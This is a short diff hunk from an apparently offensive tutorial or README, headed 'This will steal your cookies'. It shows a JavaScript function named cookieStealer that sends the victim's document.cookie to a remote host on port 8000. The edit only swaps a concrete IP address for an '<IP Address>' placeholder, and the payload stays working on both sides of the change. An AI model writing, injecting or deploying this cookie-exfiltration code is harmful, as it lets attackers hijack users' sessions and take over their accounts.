@@ -88,7 +88,7 @@ This will steal your cookies
 
 async function cookieStealer() {
 let xhr = new XMLHttpRequest();
-xhr.open('get', `http://10.156.88.35:8000?cookies = ${document.cookie}`);
+xhr.open('get', `http://<IP Address>:8000?cookies = ${document.cookie}`);
 xhr.send();
 }
 
